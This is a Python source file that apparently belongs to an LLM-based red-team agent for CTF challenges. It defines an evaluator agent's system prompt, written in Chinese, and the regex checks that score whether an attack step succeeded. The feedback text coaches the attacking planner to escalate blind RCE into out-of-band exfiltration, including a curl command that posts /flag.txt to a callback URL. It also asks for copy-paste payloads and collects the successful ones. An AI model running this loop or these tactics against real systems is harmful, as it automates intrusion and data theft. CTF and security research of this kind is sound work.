from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

from core.challenge_adapter import ChallengeAdapter
from core.llm_client import DeepSeekClient
from core.memory_store import LayeredMemory
from core.settings import Settings

# ────────────────────────────────────────────────────────────────
# 常量
# ────────────────────────────────────────────────────────────────
_MAX_OUTPUT_CHARS = 3000          # per-field budget before head+tail truncation (aligned with executor)
_HEAD_TAIL_CHARS  = 1000          # chars kept from head when truncating
_TAIL_CHARS       = 1500          # chars kept from tail (more: preserves stack traces / errors)
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mGKHF]")

# Flag 格式白名单正则（CTF 常见格式）
_FLAG_PATTERNS: list[re.Pattern] = [
    re.compile(r"flag\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"CTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"DUCTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"HTB\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"picoCTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"[A-Z0-9_]{2,10}\{[A-Za-z0-9_\-=+/]{8,200}\}", re.IGNORECASE),
]

# 强攻击成功信号（非 flag 但明确表示攻击成功）
_SUCCESS_SIGNALS: list[re.Pattern] = [
    re.compile(r"Werkzeug\s+Debugger", re.IGNORECASE),
    re.compile(r"Traceback.*SECRET", re.IGNORECASE | re.DOTALL),
    re.compile(r'"api_key"\s*:', re.IGNORECASE),
    re.compile(r'"jwt_secret"\s*:', re.IGNORECASE),
    re.compile(r'"database_password"\s*:', re.IGNORECASE),
    re.compile(r'"rendered"\s*:\s*"49"', re.IGNORECASE),
    re.compile(r"<script>[^<]{0,200}</script>", re.IGNORECASE),
]

# 无回显 RCE 判定：步骤 ok=True 但 stdout 实质为空
_BLANK_STDOUT_RE = re.compile(r"^\s*$")

_BLIND_RCE_FEEDBACK = (
    "检测到命令可能已执行但无回显 (Blind RCE)。请立即停止单纯更换命令！"
    "必须升级战术：\n"
    "1. 优先使用 SDK 中的 `redteam_sdk.OOBReceiver` 进行带外数据提取 (OOB)，"
    "例如：`oob=OOBReceiver(port=8765); oob.start(); "
    "# payload 改为 curl -d @/flag.txt {oob.url}`\n"
    "2. 若在 Java/Python 等语言上下文中，使用代码级别的文件流读取（如 Java "
    "`new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter('\\\\A').next()`）；\n"
    "3. 尝试在 shell 命令末尾追加 `2>&1` 将错误流合并到标准输出。"
)


# ────────────────────────────────────────────────────────────────
# System Prompt
# ────────────────────────────────────────────────────────────────
EVAL_SYSTEM = """你是 Co-RedTeam 评估智能体（Evaluation Agent），对齐论文 §3.3 职责。

【🔴 核心身份：零信任硬核裁判 — 最高优先级】

你是一个极其严苛、疑罪从有的裁判。你的默认立场是"攻击失败，直到看见铁证"。

【绝对禁止】以下幻觉陷阱：
  1. 严禁仅凭 HTTP 状态码（如 200、403、500）就判定"漏洞存在"或"利用成功"。
     403 可能只是 WAF 的正常拦截，500 可能只是应用自身的业务 Bug，不等于攻击成功。
  2. 严禁轻信 Planner 的自我评估（如 Plan 中声称"我认为已成功"）。
     Planner 是攻击者，它会撒谎、会自我欺骗、会产生幻觉。你只相信 Executor 传回的原始数据。
  3. 严禁在没有物理层面证据的情况下给出 repro_success=true。
     如果 raw_stdout 中看不到确凿的证据，你必须判决 status: failed。

【🟢 物理层面铁证清单 — 只有看到以下之一才能判成功】：

  证据等级 S（必须看到至少一条，repro_success=true, confidence ≥ 0.9）：
    ✅ uid=0(root) 或 uid=1000(www-data) 等系统命令输出（说明已 RCE）
    ✅ /etc/passwd 文件内容的实际回显（如 root:x:0:0:root:/root:/bin/bash）
    ✅ /etc/shadow 或 /flag.txt 等敏感文件的完整内容回显
    ✅ 数据库表名/列名/行数据的实际回显（如 SELECT 查询结果表格）
    ✅ 延时注入的时间侧信道证据：OOBReceiver 记录的请求耗时 ≥ 10 秒
    ✅ flag{...} / CTF{...} / HTB{...} 等 CTF 格式字符串的完整回显
    ✅ OOB 带外回调成功收到数据（hit 含 body/path 且内容非空）

  证据等级 A（单独不够，需多条组合才能 repro_success=true, confidence ≤ 0.7）：
    ⚠️ 命令注入后输出中出现预期系统信息（如 Linux version、kernel 版本、hostname）
    ⚠️ SSTI 注入后输出中出现数学计算结果（如 49=7*7、7777777='7'*7）
    ⚠️ SQL 注入后输出中出现数据库版本字符串（如 MySQL 8.0.33、PostgreSQL 14.2）
    ⚠️ XSS 注入后 OOBReceiver 收到带 cookie/session 的回调
    ⚠️ 文件包含后输出中出现配置文件内容（如 DB_HOST=、SECRET_KEY=）

  证据等级 F（以下情况无论如何不得判成功）：
    ❌ "HTTP 200 OK" — 这不能证明任何事
    ❌ "HTTP 403 Forbidden" — 这通常是 WAF 行为，不是利用成功
    ❌ "HTTP 500 Internal Server Error" — 可能是 payload 格式错误导致应用崩溃
    ❌ "Connection refused" — 目标挂了
    ❌ stdout 为空但 exit_code=0 — 可能是挑战环境正常响应而非漏洞触发
    ❌ 仅看到 "success": true 或 "status": "ok" 等 JSON 字段 — 可能是正常业务响应
    ❌ 仅看到 Welcome 页面、HTML title、正常业务文案 — 未触发漏洞

【输出要求】严格输出单个 JSON 对象，禁止任何 Markdown 标记，字段如下：
{
  "repro_success": bool,
  "confidence": number (0.0-1.0),
  "evidence_level": "S" | "A" | "F",
  "hard_evidence_found": "具体在 raw_stdout 的哪一行发现了什么物理铁证（若没有则填 'NONE'）",
  "analysis": {
    "what_happened": "string — 逐步描述实际发生了什么：引用真实的 HTTP 状态码、响应体片段、错误信息、OOB 回调内容",
    "vs_expectation": "string — 逐步对比每个步骤的 expected_outcome 与实际输出，说明哪些达到预期、哪些没有、为什么",
    "guidance": "string — 给 Planner 的下一步确切建议：必须包含可直接复制的代码片段或 payload，不能只说'修正字段名'"
  },
  "summary": "string — 一句话总结本轮结果，若失败必须以'[FAILED]'开头并给出驳回理由",
  "feedback_for_planner": "string — 对 Planner 的直接指令，必须可操作",
  "should_continue": bool,
  "suggest_abort": bool,
  "is_milestone": bool,
  "memory_patch": {
    "pattern": { "add_patterns": [ { ... } ] },
    "strategy": { "add_success": [ { ... } ], "add_failures": [ { ... } ] },
    "tech": { "add_commands": [ { ... } ], "add_payload_templates": [ { ... } ], "add_scripts": [ { ... } ] }
  }
}

【成功判定流程（必须严格按此顺序执行）】：

第 1 步 — 扫描 raw_stdout 中的物理铁证：
  逐行、逐段扫描每个步骤的 stdout 和 stderr 输出。
  对照"物理层面铁证清单"，判断是否出现 S 级或 A 级证据。
  在 hard_evidence_found 字段中填写证据所在的步骤 ID 和具体行内容。

第 2 步 — 对照 expected_outcome 逐条验证：
  对每个步骤，将其 expected_outcome 与实际输出对比。
  如果 Planner 声称"已获得 RCE"，但 stdout 中没有 uid= 或 /etc/passwd 内容 → 判定为幻觉，repro_success=false。

第 3 步 — 疑罪从有原则：
  如果 raw_stdout 中没有任何 S 级铁证 → repro_success=false。
  如果仅有 A 级证据 → confidence ≤ 0.7，且必须在 analysis.what_happened 中说明"暂无 S 级铁证，需进一步确认"。
  如果仅有 F 级证据 → repro_success=false，confidence ≤ 0.2。

第 4 步 — Blind RCE 特殊判定：
  若有步骤 ok=True（exit_code=0）但该步骤 stdout 实质为空，且未检测到 flag：
  → repro_success=false，confidence ≤ 0.5（绝对禁止 ≥ 0.9）
  → feedback_for_planner 必须包含 OOB 战术升级指引
  → 禁止因"exit_code=0"就断定攻击成功！

【analysis 三段论填写规则（必须严格执行）】：
- what_happened：必须引用真实的 raw_stdout 行号和内容，不能泛泛而谈。例如"step 3 的 stdout 第 12 行出现 uid=33(www-data) gid=33(www-data)"。
- vs_expectation：逐步对比 expected_outcome，明确指出差距。若 expected_outcome 是"获取 /flag.txt 内容"但 stdout 只有 "HTTP 200"，则写入"预期获取文件内容，实际仅有 HTTP 200，无任何文件数据回显 — 判定失败"。
- guidance：必须给出可直接复制的具体修复代码或 payload，不能只说"修正字段名"。若判定失败，必须给出无情的驳回理由和具体修正方案。

【memory_patch 填写规则】：
- 每个失败步骤必须对应一条 add_failures（错误模式 + 根因 + 修复建议）
- 成功步骤的有效 payload 必须记录到 tech.add_payload_templates

【JWT/JSON Polyglot 构造错误识别】：
- 所有 stdout 中出现 "Invalid base64-encoded string: number of data characters (N) cannot be 1 more than a multiple of 4" → 这是 json.dumps(dict) polyglot 构造的签名错误！必须在 guidance 中给出字符串拼接示例代码
- 所有 stdout 中出现 "Invalid JWS Object" 或 "Invalid format" → 检查是否复制了模板中的 forge 函数。严禁使用 json.dumps() 构造 polyglot JSON

【REST API 错误识别】：
- "All fields are required!" + 用了 username → 正确字段是 email，必须在 guidance 给出示例代码
- "Invalid Email Address" + payload 含 {{ 或 {% → 换用 username/fullName 字段注入
- "CSRF Detected" → 检查 token 获取与传递方式
- 同一错误连续多轮 → guidance 必须给出可直接复制的正确代码

【is_milestone — 质变突破判定规则】：
is_milestone 代表本轮发生了"质变"级别的进展，而非仅仅置信度微升。
必须将 is_milestone 设为 true 的情况（满足任一即可）：
1. 首次成功完成注册/登录，获得有效 session/token（之前均失败）
2. 首次在 raw_stdout 中检测到 S 级铁证（uid=0、/etc/passwd、flag 等）
3. 首次触发漏洞并获得实质性响应（如 SSTI 返回计算结果、SQLi 返回数据库内容）
4. 首次获得新的权限层级（如普通用户→管理员、未认证→已认证）
5. 首次收到 OOB 回调且携带有效数据（SSRF/XSS/SSTI 带外数据到达）

以下情况 is_milestone=false：
- 置信度从 0.2 升到 0.3（微小提升）
- 步骤从 1 个 ok 变成 2 个 ok，但仍是同类型的探测步骤
- 仅修复了 payload 格式错误，尚未触发漏洞
- 任何没有 S 级或 A 级证据的轮次

【suggest_abort — AI 主动熔断判定规则】：
当出现以下任一情况时，必须将 suggest_abort 设为 true：
1. **目标服务不可用**：连续多轮出现 Connection refused / DNS解析失败 / 超时，且排除沙箱网络问题。
2. **WAF/IDS 封禁触发**：响应中出现 403 Forbidden + Cloudflare/AWS WAF 特征、IP 黑名单、速率限制封禁。
3. **策略彻底耗尽**：RAG 记忆库中所有已检索到的成功策略 + Payload 变体均已尝试，且 confidence 连续 3 轮无任何提升（变化 < 0.05），同时步骤全部失败。
4. **无漏洞实际存在**：所有探测步骤均证明注入点不存在（非 payload 错误，而是根本不存在该漏洞类型）。

正常情况（payload 错误、字段名不对、转义问题等可修复问题）→ suggest_abort=false。
仅当"继续迭代已无任何意义"时才设为 true。这是一个严肃的终止决策，不可滥用。"""


# ────────────────────────────────────────────────────────────────
# 脏数据清洗
# ────────────────────────────────────────────────────────────────

def _clean_str(s: str, max_chars: int = _MAX_OUTPUT_CHARS) -> str:
    """Strip ANSI escape codes and truncate to head+tail to prevent context flooding."""
    if not isinstance(s, str):
        s = str(s)
    s = _ANSI_RE.sub("", s)
    if len(s) > max_chars:
        head = s[:_HEAD_TAIL_CHARS]
        tail = s[-_TAIL_CHARS:]
        omitted = len(s) - _HEAD_TAIL_CHARS - _TAIL_CHARS
        s = f"{head}\n...[TRUNCATED {omitted} chars]...\n{tail}"
    return s


def _sanitize_exec_output(exec_out: dict[str, Any], plan: dict[str, Any] | None = None) -> dict[str, Any]:
    """Sanitize executor output: truncate stdout/stderr with head+tail, strip ANSI.

    Also injects each step's `expected_outcome` and `purpose` from the plan so the
    LLM can compare actual output against the step's stated goal without needing to
    cross-reference a separate document.
    """
    import copy
    out = copy.deepcopy(exec_out)

    # Build a step_id → plan_step lookup for expected_outcome injection
    plan_steps: dict[int, dict] = {}
    if plan:
        for st in plan.get("steps") or []:
            if isinstance(st, dict) and st.get("id") is not None:
                plan_steps[int(st["id"])] = st

    for sr in out.get("step_results") or []:
        res = sr.get("result") or {}
        res["stdout"] = _clean_str(res.get("stdout", ""))
        res["stderr"] = _clean_str(res.get("stderr", ""), max_chars=500)
        sr["result"] = res
        # Inject expected_outcome and purpose from plan so LLM can compare directly
        step_id = sr.get("step_id")
        if step_id is not None and int(step_id) in plan_steps:
            ps = plan_steps[int(step_id)]
            sr.setdefault("expected_outcome", ps.get("expected_outcome", ""))
            sr.setdefault("purpose", ps.get("purpose", ""))
    return out


# ────────────────────────────────────────────────────────────────
# Flag / 成功信号检测
# ────────────────────────────────────────────────────────────────

def _detect_flag(text: str) -> str:
    """从文本中匹配 flag，返回第一个匹配或空字符串。"""
    for pat in _FLAG_PATTERNS:
        m = pat.search(text)
        if m:
            return m.group(0)
    return ""


def _detect_success_signal(text: str) -> str:
    """检测强攻击成功信号，返回触发的信号片段或空字符串。"""
    for pat in _SUCCESS_SIGNALS:
        m = pat.search(text)
        if m:
            return m.group(0)[:120]
    return ""


def _detect_blind_rce(step_results: list[dict[str, Any]]) -> bool:
    """Return True when at least one step succeeded (ok=True) with blank stdout.

    Unlike the old all-or-nothing check, we flag Blind RCE if *any* ok step
    has empty output — a later RCE step can be blind even if an earlier
    reconnaissance step produced output.
    """
    for sr in step_results:
        res = sr.get("result") or {}
        if res.get("ok") and _BLANK_STDOUT_RE.match(res.get("stdout", "")):
            return True
    return False


# ────────────────────────────────────────────────────────────────
# Mock 评估（无 LLM 时）
# ────────────────────────────────────────────────────────────────

def _mock_evaluate(confirmed: dict[str, Any], plan: dict[str, Any], exec_out: dict[str, Any]) -> dict[str, Any]:
    executed = exec_out.get("executed")
    if not executed:
        return {
            "version": 1,
            "repro_success": False,
            "confidence": 0.2,
            "evidence_level": "F",
            "hard_evidence_found": "NONE",
            "analysis": {
                "what_happened": "计划未被执行，验证阶段失败或计划被安全层阻止。",
                "vs_expectation": "预期执行攻击步骤，实际未执行任何步骤。",
                "guidance": "检查 validator 报错，确保步骤结构合法，type 字段为 python 或 shell，command 无语法错误。",
            },
            "summary": "[FAILED] 未执行：验证失败或计划被阻止。",
            "feedback_for_planner": "根据验证错误修订计划，保证 step 结构合法。",
            "should_continue": True,
            "suggest_abort": False,
            "is_milestone": False,
            "memory_patch": {},
        }

    results = exec_out.get("step_results") or []
    all_stdouts = " ".join((r.get("result") or {}).get("stdout", "") for r in results)
    flag = _detect_flag(all_stdouts)
    signal = _detect_success_signal(all_stdouts) if not flag else ""
    all_ok = all((r.get("result") or {}).get("ok") for r in results)
    blind_rce = _detect_blind_rce(results) if not flag else False

    if flag:
        success, confidence, evidence_level = True, 0.95, "S"
        hard_evidence = f"Flag detected: {flag}"
        what_happened = f"S级铁证：检测到 flag — {flag}"
    elif blind_rce:
        success, confidence, evidence_level = False, 0.5, "F"
        hard_evidence = "NONE"
        what_happened = "步骤退出码为 0（ok=True）但 stdout 全部为空，疑似 Blind RCE：命令已执行但无回显。无任何物理铁证。"
    elif signal:
        success, confidence, evidence_level = True, 0.7, "A"
        hard_evidence = f"Success signal: {signal[:120]}"
        what_happened = f"A级证据：检测到攻击成功信号 — {signal[:120]}"
    elif not all_stdouts.strip():
        success, confidence, evidence_level = False, 0.1, "F"
        hard_evidence = "NONE"
        what_happened = "所有步骤 stdout 均为空，无任何物理铁证，无法判断攻击结果。"
    elif all_ok:
        success, confidence, evidence_level = False, 0.3, "F"
        hard_evidence = "NONE"
        what_happened = "所有步骤退出码为 0，有输出但未检测到任何 S 级或 A 级物理铁证。仅凭 exit_code=0 不足以判定成功。"
    else:
        success, confidence, evidence_level = False, 0.2, "F"
        hard_evidence = "NONE"
        what_happened = "部分步骤失败，未检测到任何物理铁证。"

    blind_rce_feedback = _BLIND_RCE_FEEDBACK if blind_rce else (
        "若失败：拆分命令、增加探测步骤；若成功：固化可复用 payload 到技术记忆。"
    )

    return {
        "version": 1,
        "repro_success": success,
        "confidence": confidence,
        "evidence_level": evidence_level,
        "hard_evidence_found": hard_evidence,
        "analysis": {
            "what_happened": what_happened,
            "vs_expectation": "MOCK 模式：基于本地正则检测，未进行语义分析。",
            "guidance": (
                _BLIND_RCE_FEEDBACK if blind_rce
                else "启用 LLM 以获得详细的三段论分析和可操作建议。"
            ),
        },
        "summary": what_happened,
        "feedback_for_planner": blind_rce_feedback,
        "should_continue": not success or blind_rce,
        "suggest_abort": False,
        "is_milestone": bool(flag or signal),
        "memory_patch": {},
    }


# ────────────────────────────────────────────────────────────────
# 主入口
# ────────────────────────────────────────────────────────────────

def run_evaluator(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    plan: dict[str, Any],
    exec_out: dict[str, Any],
    feedback_path: Path,
    llm: DeepSeekClient | None,
    adapter: ChallengeAdapter | None = None,
) -> dict[str, Any]:
    # ── 1. 脏数据清洗（截断 + 去 ANSI）+ expected_outcome 注入
    clean_exec_out = _sanitize_exec_output(exec_out, plan=plan)

    # ── 2. 本地预判定（不依赖 LLM）────────────────────
    all_stdouts = " ".join(
        (r.get("result") or {}).get("stdout", "")
        for r in clean_exec_out.get("step_results") or []
    )
    pre_flag    = _detect_flag(all_stdouts)
    pre_signal  = _detect_success_signal(all_stdouts) if not pre_flag else ""
    pre_blind   = _detect_blind_rce(clean_exec_out.get("step_results") or []) if not pre_flag else False

    # ── 3. Mock 模式 ────────────────────────────────
    if settings.mock_llm or llm is None:
        fb = _mock_evaluate(confirmed, plan, clean_exec_out)
        memory.apply_evaluator_patch(fb.get("memory_patch") or {})
        feedback_path.parent.mkdir(parents=True, exist_ok=True)
        feedback_path.write_text(json.dumps(fb, ensure_ascii=False, indent=2), encoding="utf-8")
        return fb

    # ── 4. 构建 Prompt ──────────────────────────────
    system_prompt = EVAL_SYSTEM
    if adapter is not None:
        extra = adapter.eval_extra_rules()
        if extra:
            system_prompt = EVAL_SYSTEM + "\n\n【靶场专项规则】\n" + extra

    # 预检测结果注入（减少 LLM 幻觉）
    pre_detection_note = ""
    if pre_flag:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测】已在 stdout 中正则匹配到 flag：{pre_flag}\n"
            f"请确保 repro_success=true，should_continue=false，并在 analysis.what_happened 中引用完整 flag。"
        )
    elif pre_blind:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测 — Blind RCE 疑似】有步骤 ok=True 但 stdout 全部为空。\n"
            f"这是 Blind RCE 的典型特征：命令已执行，但输出未回显到 HTTP 响应。\n"
            f"判定规则：confidence 不得超过 0.6，repro_success=false，should_continue=true。\n"
            f"feedback_for_planner 必须包含以下内容：{_BLIND_RCE_FEEDBACK}"
        )
    elif pre_signal:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测】检测到强攻击成功信号：{pre_signal[:80]}\n"
            f"请在评估时将此信号纳入 repro_success 判定（应为 true）。"
        )

    user_payload = {
        "confirmed_vuln": confirmed,
        "plan": plan,
        "execution_result": clean_exec_out,
    }
    user_msg = json.dumps(user_payload, ensure_ascii=False) + pre_detection_note

    # ── 5. 调用 LLM ─────────────────────────────────
    fb = llm.complete_json(system_prompt, user_msg)
    fb.setdefault("version", 1)

    # ── 6. 严谨成功判定覆写（防 LLM 幻觉）─────────────
    if pre_flag and not fb.get("repro_success"):
        # 本地检测到 flag，强制成功
        fb["repro_success"] = True
        fb["should_continue"] = False
        fb.setdefault("analysis", {})
        fb["analysis"]["what_happened"] = (
            fb["analysis"].get("what_happened", "") +
            f"（本地强制覆写：检测到 flag {pre_flag}）"
        )
    elif pre_blind:
        # Blind RCE：强制降级，防止 LLM 虚报高置信度
        fb["repro_success"] = False
        fb["should_continue"] = True
        if fb.get("confidence", 0) >= 0.9:
            fb["confidence"] = 0.5
        fb.setdefault("analysis", {})
        fb["analysis"]["what_happened"] = (
            fb["analysis"].get("what_happened", "")
            + "（本地强制覆写：步骤 ok=True 但 stdout 全部为空，疑似 Blind RCE）"
        )
        # 确保 feedback_for_planner 包含 OOB 战术指引
        existing_fb = fb.get("feedback_for_planner", "")
        if "OOBReceiver" not in existing_fb:
            fb["feedback_for_planner"] = _BLIND_RCE_FEEDBACK + (
                f"\n\n（原 LLM 反馈：{existing_fb}）" if existing_fb else ""
            )
    elif not all_stdouts.strip() and fb.get("repro_success"):
        # 所有 stdout 为空，强制失败
        fb["repro_success"] = False
        fb["should_continue"] = True
        fb.setdefault("analysis", {})
        fb["analysis"]["vs_expectation"] = (
            "所有步骤 stdout 为空，不满足成功判定条件（本地强制覆写）。"
        )

    # ── 7. 确保 analysis 三段论完整 ─────────────────
    fb.setdefault("analysis", {})
    fb["analysis"].setdefault("what_happened",  "（LLM 未填写此字段）")
    fb["analysis"].setdefault("vs_expectation", "（LLM 未填写此字段）")
    fb["analysis"].setdefault("guidance",       "（LLM 未填写此字段）")
    fb.setdefault("is_milestone", False)
    fb.setdefault("evidence_level", "F")
    fb.setdefault("hard_evidence_found", "NONE")

    # ── 7.1 零信任覆写：LLM 声称成功但无 S 级铁证时强制降级 ──
    if fb.get("repro_success") and not pre_flag:
        evidence = fb.get("hard_evidence_found", "")
        raw_stdout_text = all_stdouts
        # Check for S-level physical evidence
        has_s_evidence = False
        s_patterns = [
            r"uid=\d+\(\w+\)",               # uid=0(root)
            r"root:[x*]:\d+:\d+:",           # /etc/passwd content
            r"/etc/(passwd|shadow)",          # sensitive file refs
            r"flag\{[^}]+\}",                 # flag format
            r"CTF\{[^}]+\}",                  # CTF format
            r"HTB\{[^}]+\}",                  # HTB format
        ]
        for pat in s_patterns:
            if re.search(pat, raw_stdout_text, re.IGNORECASE):
                has_s_evidence = True
                break
        if not has_s_evidence:
            fb["repro_success"] = False
            fb["confidence"] = min(fb.get("confidence", 0.5), 0.5)
            fb["evidence_level"] = "F"
            fb.setdefault("analysis", {})
            fb["analysis"]["what_happened"] = (
                fb["analysis"].get("what_happened", "")
                + "（零信任覆写：LLM 声称成功但 raw_stdout 中无 S 级物理铁证，强制降级为 failed）"
            )
            fb["summary"] = "[FAILED·零信任覆写] LLM 已宣称成功，但 raw_stdout 中缺少 S 级物理铁证（uid=0、/etc/passwd、flag 等），已被系统强制判定为失败。"

    # ── 7.2 LLM 声称失败时强制 [FAILED] 前缀 ──
    if not fb.get("repro_success"):
        existing_summary = fb.get("summary", "")
        if not existing_summary.startswith("[FAILED]"):
            fb["summary"] = "[FAILED] " + existing_summary

    # ── 7.5 history_state 透传：将当前 plan 的 history_state 作为 prior_history_state 传给下一轮 Planner ──
    current_history = plan.get("history_state")
    if current_history and isinstance(current_history, dict):
        fb["prior_history_state"] = current_history

    # ── 8. 写入记忆和文件 ────────────────────────────
    memory.apply_evaluator_patch(fb.get("memory_patch") or {})
    feedback_path.parent.mkdir(parents=True, exist_ok=True)
    feedback_path.write_text(json.dumps(fb, ensure_ascii=False, indent=2), encoding="utf-8")
    return fb
